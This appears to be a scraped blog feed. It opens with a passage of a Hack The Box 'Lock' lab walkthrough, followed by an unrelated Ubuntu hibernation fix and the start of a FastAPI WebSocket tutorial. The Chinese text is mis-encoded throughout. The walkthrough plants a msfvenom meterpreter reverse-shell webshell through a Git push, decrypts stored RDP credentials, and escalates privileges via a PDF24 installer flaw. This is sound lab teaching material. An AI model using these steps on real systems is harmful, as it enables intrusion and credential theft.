<td style="text-align: left">7370 KBï¼çº¦ 7.2MBï¼</td>
<td style="text-align: left"><code>website</code> ä½ç§¯å¤§ï¼åå®¹æ´ä¸°å¯ï¼æ¯éç¹ç®æ </td>
</tr>
<tr>
<td style="text-align: left">æéï¼permissionsï¼</td>
<td style="text-align: left">admin: true / push: true / pull: true</td>
<td style="text-align: left">admin: true / push: true / pull: true</td>
<td style="text-align: left">ä½ çä»¤çæ¥æè¯¥ä»åºç<strong>ç®¡çåæé</strong>ï¼å¯æ¨é / ä¿®æ¹ä»£ç ï¼ï¼è¿æ¯ææå³é®</td>
</tr>
<tr>
<td style="text-align: left">åéå°åï¼clone_urlï¼</td>
<td style="text-align: left"><a href="http://localhost:3000/ellen.freeman/dev-scripts.git" target="_blank" rel="noopener nofollow">http://localhost:3000/ellen.freeman/dev-scripts.git</a></td>
<td style="text-align: left"><a href="http://localhost:3000/ellen.freeman/website.git" target="_blank" rel="noopener nofollow">http://localhost:3000/ellen.freeman/website.git</a></td>
<td style="text-align: left">å¯éè¿è¯¥å°ååéä»åºå°æ¬å°åæåå®¹</td>
</tr>
</tbody>
</table>
<p>è¿è¡¨æï¼å¯¹è¯¥å­å¨åºçä»»ä½æ´æ¹é½ä¼èªå¨æ¹åæ­£å¨æç®¡çç½ç«ãå¦ææä»¬æ¥çæ­¤ç®å½åçindex.htmlé¡µé¢ï¼æä»¬ä¼æ¾å°æä»¬ä¹åè®¿é®çç½ç«çHTMLåå®¹ãè¿æå³çï¼æä»¬è½å¤åè¯¥å­å¨åºæäº¤ä»£ç ï¼å®å°è¢«èªå¨æ¨éå°è¯¥ç½ç«ã</p>
<p>æä»¬æ¹åchangelog.txtåå®¹ï¼ç¶åæäº¤å</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446301-314526916.png" alt="image-20260215152533986" loading="lazy"></p>
<pre><code>git add .

git commit -m "mane update"

git config --global user.name "ellen.freeman"

git config --global user.email "ellen.freeman"

git push


</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446608-448487180.png" alt="image-20260215152638585" loading="lazy"></p>
<p>è¿æ¶ååå»å·æ°å°±å¯ä»¥çå°æ´æ¹äº</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446910-995116.png" alt="image-20260215152659735" loading="lazy"></p>
<h2 id="æ¼æ´å©ç¨">æ¼æ´å©ç¨</h2>
<p>æ¢ç¶å¯ä»¥æåä¿®æ¹äºæå¡å¨çæä»¶ï¼ç±äºä»Nmapæ«æå¯ä»¥ç¡®è®¤Microsoft IISè¢«ç¨ä½webæå¡å¨</p>
<p><strong>æä»¬å¯ä»¥ä¸ä¼ ä¸ä¸ª.aspxç½é¡µshellä»¥å®ç°è¿ç¨ä»£ç æ§è¡ã</strong></p>
<p>æä»¬å¯ä»¥éè¿msfvenomçææ­¤ç½é¡µshell</p>
<pre><code class="language-kotlin">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx &gt; test.aspx
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447245-1785878927.png" alt="image-20260215152959165" loading="lazy"></p>
<p>ç¶åæä»¬ä½¿ç¨msfconsoleå¯å¨çå¬å¨ï¼ä»¥ä¾¿å¨webshellè§¦ååæè·ååshell</p>
<pre><code>msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.16.4;set LPORT 4444;run"
</code></pre>
<pre><code class="language-kotlin">git add test.aspx

git commit -m "reverse shell"

git push
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447555-1594619413.png" alt="image-20260215153401988" loading="lazy"></p>
<p>ååå°websiteç®å½ä¸ï¼å»è®¿é®test.aspx</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447889-460690805.png" alt="image-20260215153529160" loading="lazy"></p>
<p>å¾å°shell</p>
<p>å¨C:\Gitea\dataä¸æä¸ä¸ªgitea.dbçæ°æ®åºæä»¶</p>
<p><strong>æä»¬å°è¯ä½¿ç¨445ç«¯å£smbå±äº«</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448243-2103087620.png" alt="image-20260215154933813" loading="lazy"></p>
<p>ä½æ¯æ²¡ææé</p>
<p><strong>ä½¿ç¨giteaå½ä»¤æ´æ¹ç®¡çåå¯ç </strong></p>
<pre><code class="language-kotlin">.\gitea admin user change-password -u administrator -p chenzi123
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448575-1285427875.png" alt="image-20260215155323788" loading="lazy"></p>
<p>åç°ä¿®æ¹æå</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448925-118385955.png" alt="image-20260215155611256" loading="lazy"></p>
<p>æåç»é</p>
<p>ä½æ¯å¹¶æ²¡æä»ä¹ä¸è¥¿</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449299-764827878.png" alt="image-20260215160252187" loading="lazy"></p>
<table>
<thead>
<tr>
<th style="text-align: left">å­æ®µå</th>
<th style="text-align: left">åå¼</th>
<th style="text-align: left">æ¸éæµè¯è§£è¯»</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left"><code>EncryptionEngine</code></td>
<td style="text-align: left">AES</td>
<td style="text-align: left">å¯ç çå å¯ç®æ³æ¯ AESï¼GCM æ¨¡å¼ï¼ï¼è¿æ¯è§£å¯çå³é®åæ</td>
</tr>
<tr>
<td style="text-align: left"><code>BlockCipherMode</code></td>
<td style="text-align: left">GCM</td>
<td style="text-align: left">AES çåç»å¯ç æ¨¡å¼ï¼è§£å¯å·¥å·éè¦å¹éè¿ä¸ªæ¨¡å¼</td>
</tr>
<tr>
<td style="text-align: left"><code>KdfIterations</code></td>
<td style="text-align: left">1000</td>
<td style="text-align: left">å¯é¥æ´¾çå½æ°çè¿­ä»£æ¬¡æ°ï¼è§£å¯æ¶éè¦ç¨å°</td>
</tr>
<tr>
<td style="text-align: left"><code>Protected</code></td>
<td style="text-align: left">sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp</td>
<td style="text-align: left">mRemoteNG çä¸»å å¯å¯é¥ï¼Base64 ç¼ç ï¼ï¼è§£å¯å¯ç å¿é¡»ä¾èµè¿ä¸ªå¼</td>
</tr>
<tr>
<td style="text-align: left"><code>Name</code></td>
<td style="text-align: left">RDP/Gale</td>
<td style="text-align: left">è¿ä¸ªè¿æ¥éç½®çåç§°ï¼æåç¨æ· Gale</td>
</tr>
<tr>
<td style="text-align: left"><code>Username</code></td>
<td style="text-align: left">Gale.Dekarios</td>
<td style="text-align: left">é¶æºä¸çææç¨æ·è´¦å·ï¼æ ¸å¿ï¼åç»­ç»å½ / ææè¦ç¨ï¼</td>
</tr>
<tr>
<td style="text-align: left"><code>Password</code></td>
<td style="text-align: left">TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==</td>
<td style="text-align: left">è¯¥ç¨æ·çå å¯å¯ç ï¼Base64 ç¼ç ï¼ï¼éè¦è§£å¯æææ</td>
</tr>
<tr>
<td style="text-align: left"><code>Hostname</code></td>
<td style="text-align: left">Lock</td>
<td style="text-align: left">è¿æ¥çç®æ ä¸»æºåï¼å³é¶æºæ¬èº«ï¼</td>
</tr>
<tr>
<td style="text-align: left"><code>Protocol</code></td>
<td style="text-align: left">RDP</td>
<td style="text-align: left">è¿æ¥åè®®æ¯ RDPï¼è¿ç¨æ¡é¢ï¼ï¼ç«¯å£ 3389</td>
</tr>
<tr>
<td style="text-align: left"><code>Port</code></td>
<td style="text-align: left">3389</td>
<td style="text-align: left">RDP é»è®¤ç«¯å£ï¼è§£å¯å¯ç åå¯å°è¯è¿ç¨ç»å½</td>
</tr>
</tbody>
</table>
<p>å å¯å¯ç </p>
<pre><code>TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
</code></pre>
<p><strong>æä»¬å¯ä»¥ä½¿ç¨mRemoteNGè¿è¡è§£å¯</strong></p>
<pre><code class="language-kotlin">git clone https://github.com/kmahyyg/mremoteng-decrypt

python mremoteng_decrypt.py -rf config.xml


Username: Gale.Dekarios
Hostname: Lock
Password: ty8wnW9qCKDosXo6
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449614-657327311.png" alt="image-20260215161751842" loading="lazy"></p>
<p><strong>åç°åå®¹ä¿¡æ¯éæå³RDPï¼æåè·åRDPå­æ®ãä½¿ç¨è¿äºå­æ®ï¼æä»¬å¯ä»¥å»ºç«å°è¯¥æºå¨çRDPä¼è¯ã</strong></p>
<pre><code>xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449963-870789338.png" alt="image-20260215162312243" loading="lazy"></p>
<p>æåå¨æ¡é¢å¾å°flag</p>
<h2 id="æéæå">æéæå</h2>
<p><strong>å©ç¨CVE-2023-49147ä¸­çPDF24æ¼æ´è·åNTç³»ç»æé</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170450488-2097604170.png" alt="image-20260215162609383" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170450920-2092078689.png" alt="image-20260215163334567" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451263-28557071.png" alt="image-20260215163458580" loading="lazy"></p>
<p>æ¾å°äºåå§å®è£æä»¶ï¼æ¥ä¸æ¥è¿éè¦SetOpLock</p>
<pre><code>https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0
</code></pre>
<p>ä¸è½½å¥½åç´æ¥å¤å¶è¿æ¥å°±è¡</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451588-2020905226.png" alt="image-20260215163953620" loading="lazy"></p>
<p>æåä¸è½½åï¼æä»¬æ§è¡ä»¥ä¸å½ä»¤å¨PDF24ä½¿ç¨çfaxPrnlnt.logæä»¶ä¸åå»ºoplock</p>
<pre><code>.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" -r
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451885-1310209373.png" alt="image-20260215164444656" loading="lazy"></p>
<p>å¨oplockæºå¶å¯å¨çæåµä¸ï¼æä»¬æå¼ä¸ä¸ªæ°çå½ä»¤è¡çªå£ï¼å¹¶ä½¿ç¨æåæ»å»çPDF24 MSIå®è£ç¨åºè§¦åä¿®å¤å®è£ã</p>
<pre><code>msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452203-312618466.png" alt="image-20260215164843232" loading="lazy"></p>
<p>ä¸ç´æç¡®å®å³å¯</p>
<p>å¨å¾å°è¿ä¸ªçé¢æ¶å</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452547-762946933.png" alt="image-20260215165033124" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452844-2067885426.png" alt="image-20260215165110265" loading="lazy"></p>
<p>ä½¿ç¨ç«ç</p>
<p>ç¶åå¯å¨åï¼ä½¿ç¨ctrl+o è¾å¥cmd</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170453150-1606390944.png" alt="image-20260215165551218" loading="lazy"></p>
<p>å¾å°root</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170453606-846167594.png" alt="image-20260215165650040" loading="lazy"></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-15 17:05">2026-02-15 17:05</span>&nbsp;
<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
éè¯»(<span id="post_view_count">22</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19618342);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19618342', targetLink: 'https://www.cnblogs.com/DSchenzi/p/19618342', title: 'ãæ¸éæµè¯ãHTBé¶åºä¹Lock å¨è¿ç¨wp' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æå³Ubuntuå¨å³çä¼ç åå¯è¡çæ¯ææ¹æ³ ]]></title>
    <link>https://www.cnblogs.com/Ayeking/p/19617986</link>
    <guid>5313c4cbc03e870c8491fd239779d479</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Ayeking/p/19617986" title="åå¸äº 2026-02-15 14:05">
    <span role="heading" aria-level="2">æå³Ubuntuå¨å³çä¼ç åå¯è¡çæ¯ææ¹æ³</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>âæ¬äººå¨ä½¿ç¨èæ³å°æ°15ï¼Ubuntu22.04ï¼æ¶éå°äºå½å³çæèµ·ååå¼çåä¸ä¹ç´«å±çæåµï¼æä½¿ç¨æ´æ¢åæ ¸çæ¹æ³æ¥è§£å³äºè¿æ ·çé®é¢</p>
<h2 id="ç¡¬ä»¶ç¯å¢">ç¡¬ä»¶ç¯å¢</h2>
<ul>
<li>æºåï¼Lenovo XiaoXin Air 15ALC 2021</li>
<li>CPU: AMD Ryzenï¼éææ¾å¡ï¼</li>
<li>æ¾å¡: AMD Radeon Graphicsï¼amdgpu  é©±å¨ï¼</li>
<li>ç½å¡: Realtek rtw89_8852aeï¼WiFi 6ï¼</li>
<li>ç³»ç»: Ubuntu 24.04/win 10ï¼åç³»ç»å±å­ï¼</li>
</ul>
<h2 id="é®é¢ç°è±¡">é®é¢ç°è±¡</h2>
<p>âç³»ç»ä»ä¼ç ï¼Hibernateï¼ç¶æè¢«å¤éåï¼æ­£å¸¸ä½¿ç¨ä¸æ®µæ¶é´ï¼å åéå°åå åéï¼çªç¶Kernel Panicï¼éååªè½å¼ºå¶å³æºéå¯ã</p>
<h3 id="å³é®ç¹å¾">å³é®ç¹å¾</h3>
<ul>
<li>ä¸æ¯ç«å³å´©æºèæ¯å¤éåä½¿ç¨ä¸æ®µæ¶é´ä¹åæå´©æº</li>
<li>å¼ºå¶éå¯åç³»ç»æ¥å¿æ¾ç¤ºæ­£å¸¸ï¼æ ææéè¯¯è®°å½ï¼å´©æºæ¶æ¥ä¸ååå¥ï¼</li>
</ul>
<h2 id="æ¥å¿åæ">æ¥å¿åæ</h2>
<p>éè¿<code>journalctl -b -1 -p 3</code>æ¥çä¸æ¬¡å¯å¨çéè¯¯æ¥å¿ï¼åç°å³é®æ¥é:</p>
<pre><code class="language-bash">kernel: amdgpu 0000:03:00.0: amdgpu: Secure display: Generic Failure.
kernel: amdgpu 0000:03:00.0: amdgpu: SECUREDISPLAY: query securedisplay TA failed. ret 0x0

kernel: rtw89_8852ae 0000:01:00.0: Update probe request failed
kernel: rtw89_8852ae 0000:01:00.0: HW scan failed with status: -110
</code></pre>
<h3 id="éè¯¯è§£è¯»">éè¯¯è§£è¯»</h3>
<ol>
<li><code>amdgpu: Secure display: Generic Failure</code> :AMDæ¾å¡å¨çµæºç¶æåæ¢ï¼ä¼ç $\rightarrow$å¤éï¼æ¶ï¼PSRï¼Panel Self Refreshï¼åè½æ¢å¤å¤±è´¥</li>
<li><code>rtw89_8852ae:HW scan failed</code>: Realtek 8852ç½å¡å¨ä¼ç åWifiè¯çç¶æå¼å¸¸</li>
</ol>
<h3 id="æ ¹æ¬åå ">æ ¹æ¬åå </h3>
<ol>
<li>PSRå¼å®¹æ§é®é¢ï¼AMDæ¾å¡çPSRèè½åè½å¨å°æ°airçeDPé¢æ¿ä¸å®ç°ä¸å®åï¼ä¼ç åæ¢å¤æ¶åºç°æ¶åºéè¯¯å¯¼è´GPUé©±å¨å´©æº</li>
<li>ACPIå®ç°ç¼ºé·ï¼èæ³å°æ°ç³»åçACPIåºä»¶å¯¹Linuxæ¯æä¸ä½³ï¼<code>ideapad_laptop</code>é©±å¨å¨çµæºç®¡çäºä»¶ä¸­å¤çä¸å½</li>
<li>åæ ¸çæ¬èæ§ï¼å¯è½å­å¨ï¼:Ubuntué»è®¤çåæ ¸ç¼ºä¹å¯¹å°æ°Airççµæºç®¡çè¡¥ä¸</li>
<li>ç½å¡é©±å¨é®é¢ï¼rtw89é©±å¨å¨æ§åæ ¸ä¸­å¯¹WoWLANï¼æ çº¿å¤éï¼çæ¯æä¸å®å</li>
</ol>
<h2 id="è§£å³æ¹æ¡">è§£å³æ¹æ¡</h2>
<ol>
<li>
<p>åçº§åæ ¸ï¼æ ¸å¿è§£å³ï¼</p>
<p>ä¸»çº¿åæ ¸6.8+å·²ä¿®å¤AMD PSRårtw89ççµæºç®¡çé®é¢ï¼ä½ä¸ç¥ä¸ºä½æ¬æºéè¦åçº§å°6.14+ææ´æ°çHWEåæ ¸</p>
<pre><code class="language-bash">#æ¹æ¡Aï¼å®è£Ubuntu HWEåæ ¸ï¼æ¨èï¼å¸¦å®æ¹ç»´æ¤ï¼
sudo apt install linux-generic-hwe-24.04

# æ¹æ¡ Bï¼å®è£ä¸»çº¿åæ ¸ 6.14ï¼æå®ééç¨çæ¹æ¡ï¼
# ä» kernel.ubuntu.com ä¸è½½ï¼
# linux-headers-6.14.0-xxx-generic_amd64.deb
# linux-image-6.14.0-xxx-generic_amd64.deb
# linux-modules-6.14.0-xxx-generic_amd64.deb
sudo dpkg -i *.deb
</code></pre>
</li>
<li>
<p>ä¿®æ¹GRUBå¯å¨åæ°<br>
ç¼è¾<code>/etc/default/grub</code>,å¨<code>GRUB_CMDLINE_LINUX_DEFAULT</code>ä¸­æ·»å ï¼</p>
<pre><code class="language-bash">GRUB_CMDLINE_LINUX_DEFAULT="quiet splash amdgpu.dcdebugmask=0x10 modprobe.balcklist=ideapad_laptop"
</code></pre>
<h3 id="åæ°è¯´æ">åæ°è¯´æ</h3>
<ul>
<li><code>amdgpu.dcdebugmask=0x10</code>:ç¦ç¨PSRï¼Panel Self Refreshï¼ï¼è¿æ¯ç´«å±çç´æ¥åå¶</li>
<li><code>modprobe.blacklist=ideapad_laptop</code>:ç¦ç¨èæ³çWMIç­é®/çµæºç®¡çé©±å¨ï¼é¿åACPIå²çª</li>
</ul>
<h3 id="æ´æ°grub">æ´æ°GRUB</h3>
<pre><code class="language-bash">sudo update-grub
</code></pre>
</li>
<li>
<p>æ´æ°åºä»¶</p>
<p>ç¡®ä¿æ çº¿ç½å¡åºä»¶ä¸ºææ°</p>
<pre><code class="language-bash">#æ¥çå·²å®è£çåæ ¸
sudo grep menuentry /boot/grub/grub.cfg | grep 6.14

# è®¾ç½®ä¸ºé»è®¤å¯å¨ï¼æ ¹æ®å®éçæ¬å·è°æ´ï¼
sudo grub-set-default "Advanced options for Ubuntu&gt;Ubuntu, with Linux 6.14.0-37-generic"
sudo update-grub
</code></pre>
<h2 id="é¿åæå">é¿åæå</h2>
<ol>
<li>ä¸è¦ä½¿ç¨Noveanï¼å¦æä½¿ç¨çæ¯åæ¾å¡çæ¬ï¼å¡å¿æå®è£proprietary NVIDIAé©±å¨ï¼ä¸è¦ç¦ç¨nouveau</li>
<li>æç¨ä¼ç ï¼Linuxç¬è®°æ¬ä¼ç ï¼Hibernateï¼ä¾èµswapæä»¶ä¸å¯¹åºä»¶è¦æ±èå»ï¼å»ºè®®æ¹ç¨ç¡ç ï¼Suspendï¼æèå³æº</li>
<li>ä¿çæ§åæ ¸ï¼åçº§åä¿çæ§åæ ¸ä½ä¸ºfallbackï¼æ°åæ ¸å¯å¨å¤±è´¥æ¶å¯å¨GRUBé«çº§éé¡¹åå</li>
</ol>
<h2 id="éªè¯ç»æ">éªè¯ç»æ</h2>
<p>éå¯åæ§è¡ï¼</p>
<pre><code class="language-bash">uname -r
#è¾åºçæ¬å·:6.14.0-37-generic

systemctl suspend #æµè¯ç¡ç å¤é
</code></pre>
<h2 id="æ»ç»">æ»ç»</h2>
<p>å°æ°Air 15 2021è¿ç±»æ§ä»·æ¯è½»èæ¬å¨Linuxä¸çé®é¢å·æä»£è¡¨æ§ï¼</p>
<ul>
<li>ç¡¬ä»¶æ°åºä»¶æ§ï¼éå¸¸ACPIè¡¨åªéå¯¹Windowsè°è¯</li>
<li>Realtekç½å¡ï¼rtw89å¨6.2åæ ¸åå ä¹æ æ³ç¨³å®ç¨äºä¼ç åºæ¯ï¼å»ºè®®Intelç½å¡æºå</li>
<li>AMDæ ¸æ¾ï¼ç¸æ¯NVIDIAçå¿ï¼ä½æ¯PSRé®é¢å°æ°2020-2021çå¤æ¬¾æºå<br>
å¦æè¿½æ±å¼ç®±å³ç¨dLInuxä½éªå»ºè®®èèDell XPSãThinkPad T/Xç³»åæèFrameworkã</li>
</ul>
</li>
</ol>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-15 14:05">2026-02-15 14:05</span>&nbsp;
<a href="https://www.cnblogs.com/Ayeking">Ayeking</a>&nbsp;
éè¯»(<span id="post_view_count">37</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19617986);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19617986', targetLink: 'https://www.cnblogs.com/Ayeking/p/19617986', title: 'æå³Ubuntuå¨å³çä¼ç åå¯è¡çæ¯ææ¹æ³' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ FastAPI å®æï¼WebSocket ä»å¥é¨å°ä¸çº¿ï¼ä½¿ç¨é¿åæå ]]></title>
    <link>https://www.cnblogs.com/ymtianyu/p/19617874</link>
    <guid>c7a123a778e76e78442d707774ac1e38</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ymtianyu/p/19617874" title="åå¸äº 2026-02-15 13:13">
    <span role="heading" aria-level="2">FastAPI å®æï¼WebSocket ä»å¥é¨å°ä¸çº¿ï¼ä½¿ç¨é¿åæå</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ¬æä»¥ç¨åºåªçäº²èº«ç»åï¼åäº« FastAPI ä¸­ WebSocket çå®ææå·§ä¸å¸¸è§é·é±ãä»åºç¡ echo æå¡å¼å§ï¼éæ­¥åæå¿è·³ä¸¢å¤±ãè®¤è¯æ¼æ´ãå¹¶åç¶é¢ãä¼éå³é­ãæ¶æ¯æ ¼å¼äºå¤§é«é¢é®é¢ï¼å¹¶ç»åºå¯ç´æ¥è½å°çä»£ç ä¸éç½®æ¹æ¡ãä¸è®²æ¯ç¥çè®ºï¼åªèçå®è¸©ååçè§£å³æ¹æ¡ï¼å¸®ä½ æ WebSocket è¿æ¥ä»âè½ç¨âåå°âç¨³å¦æ³°å±±âã
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<div style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; line-height: 1.7; color: rgba(44, 62, 80, 1); font-size: 16px">
<p style="font-size: 18px; font-weight: 500; background-color: rgba(240, 249, 255, 1); padding: 20px; border-radius: 8px; border-left: 4px solid rgba(52, 152, 219, 1)">ð¬ ä½ æ¯ä¸æ¯è§å¾ WebSocket æºç®åçï¼ä¸å°±å»ºç«ä¸ªè¿æ¥ï¼ç¶å send å onmessage åï¼<br>æå½åä¹è¿ä¹æ³ï¼ç´å°æåäºä¸ä¸ªå¨çº¿åä½å°å·¥å·ï¼ä¸çº¿ç¬¬ä¸å¤©æä¸ï¼æå¡å¨ç´æ¥å´©äºï¼ç¨æ·ç¯çåæ§½ï¼âæä¹ç»çç»çå°±æ­äºï¼â é£ä¸æï¼æç¯ççæ§é¢æ¿ï¼æçæ­£æç½ââ<strong style="color: rgba(186, 55, 42, 1)">WebSocket çåï¼ä¸å¨æ¡æï¼èå¨é¿è¿æ¥çæåºä¸ã</strong></p>

<p style="background-color: rgba(242, 244, 248, 1); padding: 15px; border-radius: 8px; font-style: italic; color: rgba(74, 85, 104, 1)">ð æ¬ææè¦ï¼ä» FastAPI å®æåºåï¼åäº«å¨çäº§ç¯å¢ä¸­ç¨ WebSocket è¸©è¿çåãå¡«åçæ¹æ¡ï¼ä»¥åé£äºå®¹æå¿½ç¥çæ³¨æäºé¡¹ãè¯»å®ä½ ä¸ä»è½è·é Demoï¼è¿è½è®©è¿æ¥æ´ç¨³å®ï¼å¿éæ´æåºã</p>
<h1 style="font-size: 28px; border-bottom: 2px solid rgba(52, 152, 219, 1); padding-bottom: 8px; margin-top: 30px">ð FastAPI å®æï¼WebSocket ä½¿ç¨é¿åæåï¼è®©ä½ çé¿è¿æ¥ç¨³å¦èç</h1>

<div style="background: linear-gradient(145deg, rgba(246, 249, 252, 1), rgba(255, 255, 255, 1)); padding: 20px; border-radius: 12px; margin: 25px 0">
<p style="font-weight: 600; margin: 0 0 10px">ð¯ è¿ç¯ä½ ä¼å¾å°ä»ä¹ï¼</p>
<div style="margin-left: 15px">
<p>ð¹ ç¬¬ä¸é¨åï¼WebSocket çæ¬è´¨ï¼ç¨ä¸ä¸ªé¤åçæäºè®²éï¼</p>
<p>ð¹ ç¬¬äºé¨åï¼FastAPI éæ WebSocket çæå°å®æï¼å¸¦ä»£ç ï¼</p>
<p>ð¹ ç¬¬ä¸é¨åï¼<strong style="color: rgba(186, 55, 42, 1)">5 ä¸ªæå¸¸è§ç¿»è½¦ç¹åè§£å³æ¹æ¡</strong>ï¼å¿è·³ãè®¤è¯ãå¹¶åãé¨ç½²ãå¼å¸¸ï¼</p>
<p>ð¹ ç¬¬åé¨åï¼èç¨åºåçç¢ç¢å¿µï¼ç»éªæ»ç» + äºå¨ï¼</p>
</div>
</div>

<h2 style="font-size: 22px; margin-top: 30px">ð³ 1. åä» WebSocket æ¯ä»ä¹èèµ·ï¼ä¸ä¸ªé¤åçæ¯å»ï¼</h2>
<p>ä¼ ç»ç HTTP è¯·æ±ï¼å°±åä½ å»é¤åç¹èï¼ä½ åä¸å£°âæå¡åï¼æ¥ä»½å®«ä¿é¸¡ä¸âï¼ç¶åæå¡åè·å»åå¨ï¼æèç«¯ç»ä½ ï¼ä¸æ¬¡äº¤æç»æãä½ è¦åç¹ä¸ªç±³é¥­ï¼åå¾åä¸æ¬¡ã</p>
<p>è WebSocket å¢ï¼å®å°±åä½ ç´æ¥å¨é¤ååäºä¸ªéé´ï¼æå¡åå°±ç«å¨ä½ æ¡æï¼éæ¶å¬ä½ å©åï¼âå ç¹æ°´âãâæ¿å¤´èâãâç»è´¦â ââ æå¡åä¸ç´å¨çº¿ï¼éæ¶ååºï¼çå»äºåå¤å¼å«çè¿ç¨ã</p>
<p>FastAPI å¯¹ WebSocket çæ¯æéå¸¸ Pythonicï¼ç¨èµ·æ¥å¾é¡ºæï¼ä½æ­£å ä¸ºé¡ºæï¼å®¹æå¿½ç¥èåé£äºâæå¡åä¹å¾ä¼æ¯âãâåé´å¤ªå¤ä¼æ¥æ¤âçç°å®é®é¢ã</p>
<h2 style="font-size: 22px; margin-top: 30px">â¡ 2. æå°å®æï¼ä¸ä¸ªç®åçèå¤© echo æå¡</h2>
<p>åæ¥ä¸ªæåºç¡çï¼çç FastAPI é WebSocket é¿å¥æ ·ãä¸é¢çä»£ç å®ç°äºä¸ä¸ª echo åè½ï¼å®¢æ·ç«¯åä»ä¹ï¼æå°±åæ ·è¿åä»ä¹ã</p>
<pre class="language-python highlighter-hljs"><code>from fastapi import FastAPI, WebSocket, WebSocketDisconnect

app = FastAPI()

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            # æ¥æ¶å®¢æ·ç«¯æ¶æ¯
            data = await websocket.receive_text()
            # åæ ·è¿å
            await websocket.send_text(f"æå¡ç«¯æ¶å°: {data}")
    except WebSocketDisconnect:
        print("å®¢æ·ç«¯æ­å¼è¿æ¥")
    except Exception as e:
        print(f"åçå¼å¸¸: {e}")
        # è®°å¾ä¸»å¨å³é­è¿æ¥
        await websocket.close()</code></pre>
